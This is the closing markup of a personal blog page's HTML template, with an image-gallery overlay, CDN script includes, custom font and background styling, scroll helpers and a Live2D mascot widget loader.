                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
